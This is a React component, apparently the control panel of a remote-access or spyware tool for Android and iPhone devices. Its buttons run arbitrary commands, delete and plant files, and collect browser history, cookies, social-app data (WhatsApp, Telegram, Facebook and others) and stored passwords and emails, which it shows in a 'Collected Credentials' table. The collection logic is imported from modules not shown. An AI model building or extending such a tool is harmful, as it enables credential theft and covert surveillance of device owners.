import React, { useState } from 'react';
import { connectAndroidDevice, listFilesAndroid, runCommandAndroid, deleteFileAndroid, addFileAndroid, collectBrowserDataAndroid, collectSocialMediaDataAndroid, collectPasswordsEmailsAndroid } from './core/android';
import { collectPasswordsEmailsIphone } from './core/iphone';
import { connectIphoneDevice, listFilesIphone, runCommandIphone, deleteFileIphone, addFileIphone } from './core/iphone';

const DevicePanel = () => {
    const [deviceType, setDeviceType] = useState('android');
    const [authToken, setAuthToken] = useState('');
    const [connected, setConnected] = useState(false);
    const [deviceId, setDeviceId] = useState('demo-device');
    const [files, setFiles] = useState([]);
    const [command, setCommand] = useState('');
    const [output, setOutput] = useState('');
    const [filePath, setFilePath] = useState('');
    const [fileContent, setFileContent] = useState('');

    const handleConnect = async () => {
        let result;
        if (deviceType === 'android') {
            result = await connectAndroidDevice(authToken);
        } else {
            result = await connectIphoneDevice(authToken);
        }
        setConnected(result.connected);
    };

    const handleListFiles = async () => {
        let result;
        if (deviceType === 'android') {
            result = await listFilesAndroid(deviceId, '/');
        } else {
            result = await listFilesIphone(deviceId, '/');
        }
        setFiles(result);
    };

    const handleRunCommand = async () => {
        let result;
        if (deviceType === 'android') {
            result = await runCommandAndroid(deviceId, command);
        } else {
            result = await runCommandIphone(deviceId, command);
        }
        setOutput(result.output);
    };

    const handleDeleteFile = async () => {
        let result;
        if (deviceType === 'android') {
            result = await deleteFileAndroid(deviceId, filePath);
        } else {
            result = await deleteFileIphone(deviceId, filePath);
        }
        setOutput(result.success ? 'File deleted.' : 'Delete failed.');
    };

    const handleAddFile = async () => {
        let result;
        if (deviceType === 'android') {
            result = await addFileAndroid(deviceId, filePath, fileContent);
        } else {
            result = await addFileIphone(deviceId, filePath, fileContent);
        }
        setOutput(result.success ? 'File added.' : 'Add failed.');
    };

    // New state for data collection
    const [dataType, setDataType] = useState('browser-history');
    const [browser, setBrowser] = useState('chrome');
    const [socialApp, setSocialApp] = useState('');
    const [collectedData, setCollectedData] = useState([]);
    const [credentials, setCredentials] = useState([]);

    // Placeholder: Implement actual data collection logic for browsers and social apps
    const handleCollectData = async () => {
        let data = [];
        if (deviceType === 'android') {
            if (dataType === 'browser-history' || dataType === 'cookies' || dataType === 'downloads') {
                data = await collectBrowserDataAndroid(deviceId, browser, dataType);
            } else if (dataType === 'social-media') {
                data = await collectSocialMediaDataAndroid(deviceId, socialApp);
            } else {
                data = [`Collected ${dataType} from Android device`];
            }
        } else {
            // Demo: fallback for other device types
            if (dataType === 'browser-history') {
                data = [`Collected browser history from ${browser} on ${deviceType}`];
            } else if (dataType === 'social-media') {
                data = [`Collected data from ${socialApp} on ${deviceType}`];
            } else {
                data = [`Collected ${dataType} from ${deviceType}`];
            }
        }
        setCollectedData(data);
    };

    const handleCollectCredentials = async () => {
        let creds = [];
        if (deviceType === 'android') {
            creds = await collectPasswordsEmailsAndroid(deviceId);
        } else if (deviceType === 'iphone') {
            creds = await collectPasswordsEmailsIphone(deviceId);
        }
        setCredentials(creds);
    };

    return (
        <div style={{ padding: 16 }}>
            <h3>Device Management</h3>
            <select value={deviceType} onChange={e => setDeviceType(e.target.value)}>
                <option value="android">Android</option>
                <option value="iphone">iPhone</option>
                <option value="windows">Windows</option>
            </select>
            <input
                type="text"
                value={authToken}
                onChange={e => setAuthToken(e.target.value)}
                placeholder="Auth Token"
                style={{ marginLeft: 8 }}
            />
            <button onClick={handleConnect} style={{ marginLeft: 8 }}>Connect</button>
            {connected && (
                <>
                    {/* Existing device actions */}
                    <div style={{ marginTop: 16 }}>
                        <button onClick={handleListFiles}>List Files</button>
                        <ul>{files.map((f, i) => <li key={i}>{f}</li>)}</ul>
                    </div>
                    <div style={{ marginTop: 16 }}>
                        <input
                            type="text"
                            value={command}
                            onChange={e => setCommand(e.target.value)}
                            placeholder="Command"
                        />
                        <button onClick={handleRunCommand} style={{ marginLeft: 8 }}>Run Command</button>
                    </div>
                    <div style={{ marginTop: 16 }}>
                        <input
                            type="text"
                            value={filePath}
                            onChange={e => setFilePath(e.target.value)}
                            placeholder="File Path"
                        />
                        <button onClick={handleDeleteFile} style={{ marginLeft: 8 }}>Delete File</button>
                    </div>
                    <div style={{ marginTop: 16 }}>
                        <input
                            type="text"
                            value={filePath}
                            onChange={e => setFilePath(e.target.value)}
                            placeholder="File Path"
                        />
                        <input
                            type="text"
                            value={fileContent}
                            onChange={e => setFileContent(e.target.value)}
                            placeholder="File Content"
                            style={{ marginLeft: 8 }}
                        />
                        <button onClick={handleAddFile} style={{ marginLeft: 8 }}>Add File</button>
                    </div>
                    <div style={{ marginTop: 24, borderTop: '1px solid #ccc', paddingTop: 16 }}>
                        <h4>Data Collection</h4>
                        <select value={dataType} onChange={e => setDataType(e.target.value)}>
                            <option value="browser-history">Browser History</option>
                            <option value="cookies">Cookies</option>
                            <option value="downloads">Downloads</option>
                            <option value="social-media">Social Media</option>
                        </select>
                        {dataType === 'browser-history' || dataType === 'cookies' || dataType === 'downloads' ? (
                            <>
                                <select value={browser} onChange={e => setBrowser(e.target.value)} style={{ marginLeft: 8 }}>
                                    <option value="chrome">Chrome</option>
                                    <option value="firefox">Firefox</option>
                                    <option value="edge">Edge</option>
                                    <option value="opera">Opera</option>
                                </select>
                            </>
                        ) : null}
                        {dataType === 'social-media' && (
                            <>
                                <select value={socialApp} onChange={e => setSocialApp(e.target.value)} style={{ marginLeft: 8 }}>
                                    <option value="">Select App</option>
                                    <option value="facebook">Facebook</option>
                                    <option value="instagram">Instagram</option>
                                    <option value="twitter">Twitter</option>
                                    <option value="whatsapp">WhatsApp</option>
                                    <option value="linkedin">LinkedIn</option>
                                    <option value="telegram">Telegram</option>
                                    <option value="snapchat">Snapchat</option>
                                </select>
                            </>
                        )}
                        <button onClick={handleCollectData} style={{ marginLeft: 8 }}>Collect Data</button>
                        <button onClick={handleCollectCredentials} style={{ marginLeft: 8 }}>Collect Passwords & Emails</button>
                        <ul style={{ marginTop: 8 }}>
                            {collectedData.map((d, i) => <li key={i}>{d}</li>)}
                        </ul>
                        {credentials.length > 0 && (
                            <div style={{ marginTop: 16 }}>
                                <h5>Collected Credentials</h5>
                                <table style={{ borderCollapse: 'collapse', width: '100%' }}>
                                    <thead>
                                        <tr>
                                            <th style={{ border: '1px solid #ccc', padding: 4 }}>App/Browser</th>
                                            <th style={{ border: '1px solid #ccc', padding: 4 }}>Email</th>
                                            <th style={{ border: '1px solid #ccc', padding: 4 }}>Password</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        {credentials.map((c, i) => (
                                            <tr key={i}>
                                                <td style={{ border: '1px solid #ccc', padding: 4 }}>{c.app}</td>
                                                <td style={{ border: '1px solid #ccc', padding: 4 }}>{c.email}</td>
                                                <td style={{ border: '1px solid #ccc', padding: 4 }}>{c.password}</td>
                                            </tr>
                                        ))}
                                    </tbody>
                                </table>
                            </div>
                        )}
                    </div>
                    <div style={{ marginTop: 16, color: '#0f0' }}>{output}</div>
                </>
            )}
        </div>
    );
};

export default DevicePanel;
